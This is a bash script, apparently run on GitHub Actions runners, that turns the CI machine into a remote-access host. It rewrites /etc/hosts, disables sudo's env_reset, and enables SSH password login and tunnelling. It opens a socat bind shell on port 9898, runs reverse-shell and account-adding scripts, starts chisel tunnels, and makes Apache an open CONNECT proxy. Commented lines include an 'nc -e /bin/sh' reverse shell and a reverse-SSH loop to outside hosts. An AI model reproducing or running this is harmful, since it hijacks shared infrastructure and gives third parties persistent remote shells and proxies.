cd /tmp
exec 1>./gh-y1
exec 2>./gh-y2
set -x

TZ=UTC-8;

s1="export PATH=\$PATH:/tmp;TZ=UTC-8;
uptime;grep NA /etc/os-release 2>&1;
alias ll='ls -al';
which busybox&&(busybox netstat --help 2>&1 |grep programs);
alias nn='busybox netstat -anlp';alias pp='ps aux';alias p='busybox pstree -p';
stty rows 60 columns 400 2>&1 ;
#ll /tmp;which bash;
#which nc&&(nc --help;nc -e /bin/sh ngrok2.xiaomiqiu.cn 34302);
sp=\$PS1;PS1=\${sp//\\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\\\\u\}}
PS6=\${sp//\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\\u\}}
PS7=\${sp//\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\u\}}
PS8=\${sp//\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\\u\}}
PS9=\${sp//\\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\\u\}}
PS10=\${sp//\\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\\\u\}}
PS11=\${sp//\\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\\\\u\}}
"

s2="grep -q sftp-server /proc/\$\$/cmdline&&
(
    echo \"[ \$@ ]\$\$ \$PPID\">>non_pil.lrc;ps -ef 2>&1 >>non_pil.lrc;date +%F%T  2>&1 >>non_pil.lrc;cat /proc/\$\$/cmdline>>non_pil.lrc;   
)||( echo non_pil;$s1)"





sudo bash -c 'echo 180.76.198.77 gitee.com  >> /etc/hosts'
#45.195.136.233
sudo bash -c 'echo 139.196.235.6 cn-sh-2.lcf.im   >> /etc/hosts'

sudo touch /bin/edge;
sudo touch /bin/bing;
cp /tmp/busybox.bin /tmp/busybox &




if [ ! -z ${GITHUB_WORKSPACE} ]; then 
sudo chmod 0777 -R $GITHUB_WORKSPACE/ ;
[ -x $GITHUB_WORKSPACE/socat.bin ]&&busybox setsid $GITHUB_WORKSPACE/socat.bin -v tcp-l:9898,bind=0.0.0.0,fork,reuseaddr exec:"bash -pil",pty,stderr,setsid,sigint,sane &
fi

sudo bash -c ' mkdir /tmp/{A,aB};
chmod 0777 /tmp/{A,aB};
sed -i "s|Defaults\tenv_reset|Defaults \!env_reset|g" /etc/sudoers;
grep -v "^#" /etc/sudoers | grep -v "^$"  2>&1 > /tmp/js9_sudo.txt

rm -f /etc/ssh/sshd_config.d/*.conf

echo  -e "PasswordAuthentication yes\nPermitTunnel yes" > /etc/ssh/sshd_config.d/99liu.conf
'


# github_rev_ssh
(id | grep "^uid=[0-9]\{1,9\}(runner)") && 
(
    sudo touch /tmp/keepalive;sudo chmod 0777 /tmp/keepalive;
    sudo touch /tmp/0a9.txt; sudo chmod 0777 /tmp/0a9.txt;
    alias ll="ls -al";
    d1="/bin/sh";
    (which  ash) && d1=$(which  ash);
    (which bash) && d1=$(which bash);

    cd /tmp;
    #每日签到 登陆
    grep -q XXYYZZ /tmp/js9 &&
    ( 
    sudo python3 -m pip install   ddddocr  -i http://pypi.douban.com/simple --trusted-host pypi.douban.com
    sudo python3 -m pip install  requests  -i http://pypi.douban.com/simple --trusted-host pypi.douban.com
    sudo python3 $GITHUB_WORKSPACE/run_req_yun.py
    rm /tmp/keepalive;
    exit 0;
    ) 


grep -q AABBCC_rev_shell /tmp/js9 &&
(
export HOME=/tmp;
sudo -H su -l -c /home/runner/work/nc_test/nc_test/AABBCC_rev_shell.sh;
)

# 无条件执行 
. $GITHUB_WORKSPACE/cs45.sh  &



#修改系统密码 添加系统账户tee chisel-60080  ttyd.x64 重启sshd
grep -q "tee" /etc/passwd ||
(
    . /home/runner/work/nc_test/nc_test/tee_pass.sh;
)

grep -q wub /tmp/js9&&
( 
. /home/runner/work/nc_test/nc_test/wub.sh;
) 

# . /home/runner/work/nc_test/nc_test/docker32; # thinkphp redis





# npv和xrdp都具备
grep -q NPV /tmp/js9&&grep -q xrdp /tmp/js9&&
(
. $GITHUB_WORKSPACE/openv.sh
#sudo bash -c 'mkdir -pv /run/user/1000;chmod 0777 /run/user/1000;chmod 0777 /home/runneradmin;chmod 0777 /home/runneradmin/*;chmod 0777 /home/runneradmin/.*;'
sleep 1;
. $GITHUB_WORKSPACE/xrdp.sh;
)&



# 无npv但是有xrdp
# mkdir -pv /run/user/1000;
# chmod 0777 /run/user/1000;

grep -q NPV /tmp/js9||(
grep -q xrdp /tmp/js9&&(
. $GITHUB_WORKSPACE/xrdp.sh;   #chrome
)
)&



# 无xrdp但是有npv
grep -q xrdp /tmp/js9||(
grep -q NPV /tmp/js9&&(. $GITHUB_WORKSPACE/openv.sh)
)&

grep -q vokeai /tmp/js9&&
(
. $GITHUB_WORKSPACE/vokeai.sh;
)&
#docker run --gpus all -it --privileged -p 9090:9090 --name ai invokeai/invokeai;

grep -q xfce /tmp/js9&&
(
. $GITHUB_WORKSPACE/xfce.sh;
)&









# apachectl   -l
# apachectl   -L
# apachectl   -M   ; apt install -y libapache2-mod-php7.4
#  libapache2-mod-php7.4 : Depends: php7.4-common (= 7.4.3-4ubuntu2.19) but 1:7.4.33-8+ubuntu20.04.1+deb.sury.org+1 is to be installed
#  sudo apt-get install php7.4-common=7.4.3-4ubuntu2.19
# root@fv-az1492-145:/tmp# sudo apt-cache   search libapache2-mod-php
# libapache2-mod-php - server-side, HTML-embedded scripting language (Apache 2 module) (default)
# libapache2-mod-php7.4 - server-side, HTML-embedded scripting language (Apache 2 module)
# php7.4-fpm - server-side, HTML-embedded scripting language (FPM-CGI binary)
# php8.0-fpm - server-side, HTML-embedded scripting language (FPM-CGI binary)
# php8.1-fpm - server-side, HTML-embedded scripting language (FPM-CGI binary)
# php8.2-fpm - server-side, HTML-embedded scripting language (FPM-CGI binary)
# root@fv-az1492-145:/tmp# 

# https://mirrors.aliyun.com/ubuntu/pool/main/p/php7.4/libapache2-mod-php7.4_7.4.3-4ubuntu2.19_amd64.deb?spm=a2c6h.25603864.0.0.6b9421e3yMgFVN




(
sudo -H bash -c '
curl -s cip.cc >/var/www/html/index.html &
sed -i "s/\(Listen 80\)/ \\nListen 30080/g"  /etc/apache2/ports.conf;
cat  /etc/apache2/ports.conf;
sed -i "s/#\(ProxyRequests On\)/\1\\nAllowCONNECT  1-65534 /g" /etc/apache2/mods-available/proxy.conf;
a2enmod proxy;\
a2enmod proxy_connect;\
a2enmod proxy_http;a2enmod proxy_fcgi;a2enconf php8.1-fpm;\
systemctl restart apache2;
'
)&




#  ls -al /etc/apache2/conf-enabled/php7.4-fpm.conf*;
#. /home/runner/work/nc_test/nc_test/tinyproxy-apache.sh




#使用密码解压zip，#启动小米球客户端 ，以便正向连接，但是小米球在国外上线会被禁止
cd /tmp;
pd127=$(grep -oP "(?<=PPP).*(?=WWW)" /tmp/js9);

if  [ ! -z ${pd127} ]; then
    #sudo bash -c 'id'
    #sleep  120;
    sudo unzip -P ${pd127}  /home/runner/work/nc_test/nc_test/docs/free-us1-udp7z.zip  -d /home/;
    #sleep  120;
    echo qwertyi;
    #  echo 'id;'|sudo -H bash  
    (setsid  bash -c "sudo -H su -c 'bash /home/mychisel.sh'" &)
    #. /home/runner/work/nc_test/nc_test/xiaoMiq4040.sh
fi





# frp大带宽 upx-ssh反弹至xiaomiQ
#grep -q AABBCC_10000MDL /tmp/js9 &&
#(  
    #echo 123rt5;      
    #bash /home/runner/work/nc_test/nc_test/upx-ssh2xiaomiQ.sh &
#) 

# (while true; do
#         [ ! -f /tmp/keepalive ] && break        
#          num61z2=$(date +%S);
#          num67z2=$(echo "1"$num61z2);
#          num762=$((${num67z2}%8));
#          bport2=5005"$num762";
#          [ -x $GITHUB_WORKSPACE/upx_reverse-sshx64.bin ]&&sudo sh -c "$GITHUB_WORKSPACE/upx_reverse-sshx64.bin -v -b $bport2 -p 52310 vip.guyubao.com";
#          echo "exit_revSSH2_isOK2_$bport2";
#          echo "will sleep 13s for while true";
#          date;
#          sleep 13; 
# done
# )&


#sudo -H su -l -c ' #cd /root/.ssh;ls -al;
#(
#echo -e "ssh-keygen -t rsa\n";sleep 1.5;echo -e "\n\n\n\n";sleep 2;echo -e "\n\ncat id_rsa.pub >> ./authorized_keys;\nid;echo 123789;\n";sleep 1;echo -e "\n\nexit\nexit\n";
#)|script /tmp/nu_root;
#'



#如下代码在本机依靠sshd产生socks5-61080代理，就不依赖别的软件了
mkdir ~/.ssh;
cd ~/.ssh;


#(
#    (
#        echo -e "ssh-keygen -t rsa\n";sleep 1.5;echo -e "\n\n\n\n";sleep 2;echo -e "\n\nls -al;cp id_rsa.pub authorized_keys4;\nid;echo 12356;\n";sleep 0.6;echo -e "\n\nexit\nexit\n";
#    )|script /tmp/nul2;
#ls -al  /home/runner/.ssh/;


#if [[ -f /home/runner/.ssh/id_rsa.pub &&  -s /home/runner/.ssh/id_rsa.pub ]];then
 #cp id_rsa.pub authorized_keys;
 #sudo mkdir /root/.ssh/;
 #sudo bash -c "cat /home/runner/.ssh/id_rsa.pub >>/root/.ssh/authorized_keys;"
 #echo 1784-ssh-rsa;
#fi

#  #-s file 文件大小非0时为真
#if [[ -f /home/runner/.ssh/authorized_keys &&  -s /home/runner/.ssh/authorized_keys ]];then
#    ssh -o StrictHostKeyChecking=no -f -N -D 0.0.0.0:61080  runner@127.0.0.1;
#fi

#) 2>&1 >/tmp/nu2 &



)



# 从runner 登陆root@127.0.0.1,输入yes后免密
# 从runner 登陆runner@127.0.0.1,直接免密
# 从runner 登陆runner@127.0.0.2,输入yes后免密


# 依据环境变量sleep
if [ ! -z ${sp9} ]; then sleep $sp9; fi

#[ -z ${sp5} ] && sleep $sp5
